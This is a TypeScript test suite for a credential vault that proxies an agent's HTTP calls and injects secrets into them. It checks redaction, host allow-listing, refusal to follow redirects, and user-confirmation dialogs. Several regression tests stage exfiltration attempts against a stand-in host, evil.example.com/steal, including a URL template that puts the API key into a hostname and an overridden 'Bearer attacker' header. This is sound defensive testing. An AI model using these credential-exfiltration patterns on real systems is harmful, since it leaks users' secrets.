import assert from "node:assert/strict";
import fs from "node:fs";
import http from "node:http";
import os from "node:os";
import path from "node:path";
import { after, before, beforeEach, describe, it } from "node:test";
import { dispatch } from "../helper/dispatch.js";
import { allowInsecureLoopbackForTests } from "../helper/protocols/http.js";
import { setUserConfirmForTests } from "../helper/user-dialog.js";
import { Vault } from "../helper/vault.js";
import { hostFromUrlTemplate, typeFromTemplate } from "../server/tools/http.js";
import { getTemplate, resolveOAuthProvider, searchTemplates } from "../server/templates.js";
import type { Op } from "../shared/protocol.js";

// ---------- Mock API: echoes back the received request (used to check injection and redaction) ----------
let base = "";
let server: http.Server;
const received: Array<{ url: string; headers: http.IncomingHttpHeaders; body: string }> = [];

before(async () => {
  allowInsecureLoopbackForTests(true);
  server = http.createServer((req, res) => {
    let body = "";
    req.on("data", (c) => (body += c));
    req.on("end", () => {
      received.push({ url: req.url!, headers: req.headers, body });
      const u = new URL(req.url!, "http://x");
      if (u.pathname === "/redirect") {
        res.writeHead(302, { Location: "https://evil.example.com/steal" }).end();
      } else if (u.pathname === "/bin") {
        res.writeHead(200, { "Content-Type": "application/octet-stream" });
        res.end(Buffer.concat([Buffer.from([0, 1, 2]), Buffer.from(String(req.headers.authorization ?? ""))]));
      } else if (u.pathname === "/hex") {
        res.writeHead(200, { "Content-Type": "text/plain" });
        res.end(Buffer.from(String(req.headers.authorization ?? "").replace("Bearer ", "")).toString("hex").toUpperCase());
      } else if (u.pathname === "/me") {
        res.writeHead(req.headers.authorization === "Bearer sk-SECRET-123456" ? 200 : 401, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ ok: req.headers.authorization === "Bearer sk-SECRET-123456" }));
      } else {
        // Echo: deliberately put the auth info into the response, to test redaction
        res.writeHead(200, { "Content-Type": "application/json", "X-Echo-Auth": String(req.headers.authorization ?? "") });
        res.end(JSON.stringify({ path: u.pathname, query: Object.fromEntries(u.searchParams), headers: req.headers, body }));
      }
    });
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  base = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
});

after(() => {
  server.close();
  allowInsecureLoopbackForTests(false);
  setUserConfirmForTests(null);
});

let vault: Vault;
let confirms: string[] = [];
let confirmAnswer = true;
beforeEach(() => {
  vault = new Vault(path.join(fs.mkdtempSync(path.join(os.tmpdir(), "credmcp-h-")), "vault"));
  vault.init();
  received.length = 0;
  confirms = [];
  confirmAnswer = true;
  setUserConfirmForTests(async (msg) => {
    confirms.push(msg);
    return confirmAnswer;
  });
});

async function call<T = Record<string, unknown>>(op: Op, params: Record<string, unknown>): Promise<T> {
  const r = await dispatch(vault, { id: 1, op, params: { purpose: "automated test", ...params } }, { session: "t" });
  if (!r.ok) throw new Error(r.error);
  return r.result as T;
}

const SECRET = "sk-SECRET-123456";

async function setOpenAiLike(extra: Record<string, unknown> = {}) {
  return call("set", {
    type: "open_ai_api",
    name: "main",
    secrets: { apiKey: SECRET },
    attributes: { url: base },
    template: "openai",
    http: { inject: { headers: { Authorization: "Bearer {{apiKey}}" } }, allowed_hosts: ["127.0.0.1"], test: { method: "GET", url: "{{url}}/me" }, ...extra },
  });
}

describe("template catalog", () => {
  it("the built-in template catalog is searchable: the OpenAI template has an injection rule, a test request, and hosts; built-in templates rank first", () => {
    const top = searchTemplates("openai", undefined, 10)[0]!;
    assert.equal(top.id, "openai");
    assert.equal(top.source, "catalog");
    const t = getTemplate("OpenAI")!;
    assert.deepEqual(t.inject, { headers: { Authorization: "Bearer {{apiKey}}" } });
    assert.deepEqual(t.hosts, ["api.openai.com"]);
    assert.equal(t.test?.url, "https://api.openai.com/v1/models");
    assert.equal(searchTemplates("bearer", undefined, 5)[0]!.source, "builtin");
  });

  it("every template in the built-in catalog is self-consistent: placeholder references exist as fields, and test requests are https", () => {
    const catalog = JSON.parse(fs.readFileSync(path.join(process.cwd(), "templates", "catalog.json"), "utf8")) as { templates: Array<Record<string, any>> };
    assert.ok(catalog.templates.length >= 40);
    for (const t of catalog.templates) {
      const names = new Set((t.fields as Array<{ name: string }>).map((f) => f.name));
      const refs = JSON.stringify([t.inject, t.test]).match(/\{\{(\w+)\}\}/g)?.map((m) => m.slice(2, -2)) ?? [];
      for (const r of refs) assert.ok(names.has(r), `${t.id} references a nonexistent field ${r}`);
      assert.ok(t.inject, `${t.id} is missing an injection rule`);
      assert.ok(t.test || t.hosts?.length, `${t.id} has neither a test request nor hosts`);
      if (t.test) assert.match(t.test.url, /^(https:\/\/|\{\{apiUrl\}\})/, t.id);
    }
  });

  it("an n8n OAuth2 template can be used as an OAuth provider (requires the n8n template catalog to be generated locally)", { skip: !getTemplate("gmailOAuth2") && "n8n template catalog not generated" }, () => {
    const p = resolveOAuthProvider("gmailOAuth2")!;
    assert.equal(p.token_url, "https://oauth2.googleapis.com/token");
    assert.ok(p.default_scopes.includes("https://mail.google.com/"));
    assert.equal(p.extra_auth_params?.access_type, "offline");
    assert.equal(resolveOAuthProvider("google")!.label, "Google", "built-in preset takes priority");
  });

  it("type name and host derivation", () => {
    assert.equal(typeFromTemplate("openAiApi"), "open_ai_api");
    assert.equal(hostFromUrlTemplate("{{url}}/models", { url: "https://api.openai.com/v1" }), "api.openai.com");
    assert.equal(hostFromUrlTemplate("https://api.trello.com/1/tokens/{{apiToken}}/member", {}), "api.trello.com");
    assert.equal(hostFromUrlTemplate("https://{{subdomain}}.zendesk.com/api", { subdomain: "acme" }), "acme.zendesk.com");
    assert.equal(hostFromUrlTemplate("https://{{subdomain}}.zendesk.com/api", {}), null, "cannot be determined when the host contains a secret/unknown field");
  });
});

describe("proxied calls", () => {
  it("injects the auth header; secrets echoed back in the response (including headers) are redacted", async () => {
    await setOpenAiLike();
    const r = await call<{ status: number; body: string; headers: Record<string, string> }>("httpRequest", {
      type: "open_ai_api", name: "main", method: "POST", url: `${base}/v1/chat`, body: { hello: "world" },
    });
    assert.equal(received[0]!.headers.authorization, `Bearer ${SECRET}`, "upstream received the injected auth header");
    assert.equal(received[0]!.headers["content-type"], "application/json");
    assert.equal(r.status, 200);
    assert.equal(r.body.includes(SECRET), false);
    assert.match(r.body, /"authorization":"\[REDACTED\]"/);
    assert.equal(r.headers["x-echo-auth"], undefined, "non-whitelisted response headers are not returned");
    assert.equal(JSON.stringify(r).includes(SECRET), false);
  });

  it("the agent cannot override the auth header; can only send to allowed hosts; does not follow redirects", async () => {
    await setOpenAiLike();
    await call("httpRequest", { type: "open_ai_api", name: "main", url: `${base}/x`, headers: { authorization: "Bearer attacker" } });
    assert.equal(received[0]!.headers.authorization, `Bearer ${SECRET}`);
    await assert.rejects(call("httpRequest", { type: "open_ai_api", name: "main", url: "https://evil.example.com/steal" }), /不在该凭证允许的范围内/);
    const r = await call<{ status: number; headers: Record<string, string> }>("httpRequest", { type: "open_ai_api", name: "main", url: `${base}/redirect` });
    assert.equal(r.status, 302);
    assert.equal(r.headers.location, "https://evil.example.com/steal");
    assert.equal(received.length, 2, "did not follow the redirect");
  });

  it("query param injection, Basic auth, header name expanded from a non-secret field (generic header template)", async () => {
    await call("set", { type: "t", name: "q", secrets: { key: "QKEY-987654" }, http: { inject: { query: { api_key: "{{key}}" } }, allowed_hosts: ["127.0.0.1"] } });
    await call("httpRequest", { type: "t", name: "q", url: `${base}/a`, query: { api_key: "spoof", x: "1" } });
    assert.match(received[0]!.url, /api_key=QKEY-987654/);
    assert.match(received[0]!.url, /x=1/);

    await call("set", { type: "t", name: "b", secrets: { password: "pw-123456" }, attributes: { user: "alice" }, http: { inject: { basic: { username: "{{user}}", password: "{{password}}" } }, allowed_hosts: ["127.0.0.1"] } });
    const r = await call<{ body: string }>("httpRequest", { type: "t", name: "b", url: `${base}/b` });
    assert.equal(received[1]!.headers.authorization, `Basic ${Buffer.from("alice:pw-123456").toString("base64")}`);
    assert.equal(r.body.includes(Buffer.from("alice:pw-123456").toString("base64")), false);

    await call("set", { type: "t", name: "h", secrets: { key: "HKEY-555555" }, attributes: { headerName: "X-Api-Key" }, http: { inject: { headers: { "{{headerName}}": "{{key}}" } }, allowed_hosts: ["127.0.0.1"] } });
    await call("httpRequest", { type: "t", name: "h", url: `${base}/h` });
    assert.equal(received[2]!.headers["x-api-key"], "HKEY-555555");
  });

  it("test request", async () => {
    await setOpenAiLike();
    assert.deepEqual(await call("httpTest", { type: "open_ai_api", name: "main" }), { ok: true, status: 200, excerpt: '{"ok":true}' });
  });

  it("proxy_only: the raw value cannot be read, but it can still be proxied; turning it off needs user confirmation", async () => {
    await setOpenAiLike({ proxy_only: true });
    await assert.rejects(call("get", { type: "open_ai_api", name: "main" }), /只能代理调用/);
    const info = await call<{ http: { proxy_only: boolean } }>("info", { type: "open_ai_api", name: "main" });
    assert.equal(info.http.proxy_only, true);
    await call("httpRequest", { type: "open_ai_api", name: "main", url: `${base}/x` });

    confirmAnswer = false;
    await assert.rejects(call("httpConfigure", { type: "open_ai_api", name: "main", proxy_only: false }), /用户拒绝/);
    await assert.rejects(call("get", { type: "open_ai_api", name: "main" }), /只能代理调用/);
    confirmAnswer = true;
    await call("httpConfigure", { type: "open_ai_api", name: "main", proxy_only: false });
    assert.equal((await call<{ fields: Record<string, string> }>("get", { type: "open_ai_api", name: "main" })).fields.apiKey, SECRET);
  });

  it("adding a host or changing the injection rule needs user confirmation; turning on proxy_only doesn't", async () => {
    await setOpenAiLike();
    confirmAnswer = false;
    await assert.rejects(call("httpConfigure", { type: "open_ai_api", name: "main", allowed_hosts: ["127.0.0.1", "evil.example.com"] }), /用户拒绝/);
    await assert.rejects(call("httpConfigure", { type: "open_ai_api", name: "main", inject: { query: { k: "{{apiKey}}" } } }), /用户拒绝/);
    assert.equal(confirms.length, 2);
    assert.match(confirms[0]!, /新增允许发往的域名：evil\.example\.com/);
    await call("httpConfigure", { type: "open_ai_api", name: "main", proxy_only: true });
    assert.equal(confirms.length, 2, "tightening permissions doesn't show a dialog");
    await assert.rejects(call("httpConfigure", { type: "open_ai_api", name: "main", allowed_hosts: ["localhost"] }), /非法的域名/);
  });

  it("a credential without proxy configuration cannot be proxied; both reading and proxying must state a purpose", async () => {
    vault.set({ type: "api_key", name: "plain", value: "v-123456" });
    await assert.rejects(call("httpRequest", { type: "api_key", name: "plain", url: `${base}/x` }), /没有配置代理调用/);
    const r = await dispatch(vault, { id: 1, op: "httpRequest", params: { type: "api_key", name: "plain", url: `${base}/x` } }, {});
    assert.equal(r.ok, false);
  });

  it("oauth2 credentials automatically inject the access token when proxied (the agent never sees the token)", async () => {
    await call("setupProtocol", {
      kind: "oauth2", type: "oauth2", name: "svc", secrets: {},
      config: { provider: "custom", client_id: "cid", authorization_url: "https://a.example.com/auth", token_url: "https://a.example.com/token", token_auth_method: "none" },
    });
    const gen = vault.getRecord("oauth2", "svc").record.generation;
    vault.patchRecord("oauth2", "svc", "oauth2", gen, (rec) => {
      rec.state = { access_token: "AT-TOKEN-777777", expires_at: Date.now() + 3600_000 };
    });
    await assert.rejects(
      call("httpConfigure", { type: "oauth2", name: "svc", allowed_hosts: ["127.0.0.1"], inject: { headers: { A: "{{client_secret}}" } } }),
      /不存在的字段 client_secret/,
      "a custom rule for a token-type credential cannot reference long-term secrets",
    );
    await call("httpConfigure", { type: "oauth2", name: "svc", allowed_hosts: ["127.0.0.1"] });
    assert.equal(confirms.length, 1, "turning on proxying for an existing credential for the first time needs confirmation");
    const r = await call<{ body: string }>("httpRequest", { type: "oauth2", name: "svc", url: `${base}/graph` });
    assert.equal(received[0]!.headers.authorization, "Bearer AT-TOKEN-777777");
    assert.equal(r.body.includes("AT-TOKEN-777777"), false);
  });

  it("the audit record includes the target (method + host + path, without query params)", async () => {
    await setOpenAiLike();
    await call("httpRequest", { type: "open_ai_api", name: "main", url: `${base}/v1/models?secret=abc`, purpose: "List models" });
    const log = fs.readFileSync(vault.auditPath, "utf8");
    assert.match(log, /"target":"GET 127\.0\.0\.1:\d+\/v1\/models"/);
    assert.equal(log.includes("secret=abc"), false);
    assert.equal(log.includes(SECRET), false);
  });

  // ---------- Regression tests from the second security review ----------

  it("[critical] modifying the test request cannot reference secret fields (attack path reproduced by the review)", async () => {
    await setOpenAiLike({ proxy_only: true });
    for (const url of ["{{apiKey}}", "https://{{apiKey}}.x.invalid/", `${base}/me?k={{apiKey}}`]) {
      await assert.rejects(call("httpConfigure", { type: "open_ai_api", name: "main", test: { method: "GET", url } }), /不能引用秘密字段/);
    }
    await assert.rejects(call("httpConfigure", { type: "open_ai_api", name: "main", test: { method: "POST", url: `${base}/me` } }), /只能是 GET 或 HEAD/);
    await call("httpConfigure", { type: "open_ai_api", name: "main", test: { method: "GET", url: "{{url}}/me" } });
  });

  it("[critical] a protocol credential's long-term secret is not used in rendering", async () => {
    await call("setupProtocol", {
      kind: "oauth2", type: "oauth2", name: "svc", secrets: { client_secret: "CLIENT-SECRET-999" },
      config: { provider: "custom", client_id: "cid", authorization_url: "https://a.example.com/auth", token_url: "https://a.example.com/token" },
    });
    await assert.rejects(
      call("httpConfigure", { type: "oauth2", name: "svc", allowed_hosts: ["127.0.0.1"], test: { method: "GET", url: `${base}/x?s={{client_secret}}` } }),
      /不存在的字段 client_secret/,
    );
  });

  it("[critical] secrets are redacted from error messages (including the audit log), even when lowercased", async () => {
    // Template test requests are allowed to reference secrets (written alongside the new secret); construct a test request that puts the secret into the hostname
    await setOpenAiLike({ test: { method: "GET", url: "https://{{apiKey}}.evil.com/" } });
    const r = await dispatch(vault, { id: 1, op: "httpTest", params: { type: "open_ai_api", name: "main", purpose: "test" } }, { session: "t" });
    assert.equal(r.ok, false);
    const err = !r.ok ? r.error : "";
    assert.equal(err.toLowerCase().includes(SECRET.toLowerCase()), false, err);
    assert.match(err, /REDACTED/);
    assert.equal(fs.readFileSync(vault.auditPath, "utf8").toLowerCase().includes(SECRET.toLowerCase()), false);
  });

  it("[high] refuses to return a binary response containing a secret; hex-encoded (uppercase) forms are redacted too", async () => {
    await setOpenAiLike();
    await assert.rejects(call("httpRequest", { type: "open_ai_api", name: "main", url: `${base}/bin` }), /拒绝返回/);
    const r = await call<{ body: string }>("httpRequest", { type: "open_ai_api", name: "main", url: `${base}/hex` });
    assert.equal(r.body, "[REDACTED]");
  });

  it("[medium] a proxy_only token-type credential cannot have its access token extracted, but can still be proxied", async () => {
    await call("setupProtocol", {
      kind: "oauth2", type: "oauth2", name: "svc", secrets: {},
      config: { provider: "custom", client_id: "cid", authorization_url: "https://a.example.com/auth", token_url: "https://a.example.com/token", token_auth_method: "none" },
    });
    vault.patchRecord("oauth2", "svc", "oauth2", vault.getRecord("oauth2", "svc").record.generation, (rec) => {
      rec.state = { access_token: "AT-TOKEN-777777", expires_at: Date.now() + 3600_000 };
    });
    await call("httpConfigure", { type: "oauth2", name: "svc", allowed_hosts: ["127.0.0.1"], proxy_only: true });
    await assert.rejects(call("accessToken", { type: "oauth2", name: "svc" }), /只能代理调用/);
    await assert.rejects(call("accessToken", { type: "oauth2", name: "svc", viaProxy: true }), /只能代理调用/, "an external request cannot forge the internal flag");
    await call("httpRequest", { type: "oauth2", name: "svc", url: `${base}/x` });
    assert.equal(received.at(-1)!.headers.authorization, "Bearer AT-TOKEN-777777");
  });

  it("[medium] overwrite and delete are confirmed by a helper dialog", async () => {
    await setOpenAiLike();
    confirmAnswer = false;
    await assert.rejects(call("set", { type: "open_ai_api", name: "main", value: "attacker-key", overwrite: true }), /用户拒绝了覆盖/);
    await assert.rejects(call("delete", { type: "open_ai_api", name: "main" }), /用户拒绝了删除/);
    assert.equal(vault.getRecord("open_ai_api", "main").record.secrets!.apiKey, SECRET);
    confirmAnswer = true;
    await call("delete", { type: "open_ai_api", name: "main" });
    assert.match(confirms.at(-1)!, /删除凭证/);
  });

  it("a GET request cannot carry a body", async () => {
    await setOpenAiLike();
    await assert.rejects(call("httpRequest", { type: "open_ai_api", name: "main", url: `${base}/x`, body: "x" }), /不能带请求体/);
  });

  it("token-type credentials support custom injection: {{access_token}} (e.g. the Basic auth required by GitHub git push)", async () => {
    await call("setupProtocol", {
      kind: "oauth2", type: "oauth2", name: "gh", secrets: {},
      config: { provider: "github", client_id: "cid", authorization_url: "https://a.example.com/auth", token_url: "https://a.example.com/token", token_auth_method: "none" },
    });
    vault.patchRecord("oauth2", "gh", "oauth2", vault.getRecord("oauth2", "gh").record.generation, (rec) => {
      rec.state = { access_token: "gho_TOKEN_123456", expires_at: Date.now() + 3600_000 };
    });
    await call("httpConfigure", {
      type: "oauth2", name: "gh", allowed_hosts: ["127.0.0.1"],
      inject: { basic: { username: "x-access-token", password: "{{access_token}}" } },
    });
    const r = await call<{ body: string }>("httpRequest", { type: "oauth2", name: "gh", url: `${base}/git` });
    assert.equal(received.at(-1)!.headers.authorization, `Basic ${Buffer.from("x-access-token:gho_TOKEN_123456").toString("base64")}`);
    assert.equal(r.body.includes("gho_TOKEN_123456"), false);
    assert.equal(r.body.includes(Buffer.from("x-access-token:gho_TOKEN_123456").toString("base64")), false);
  });
});
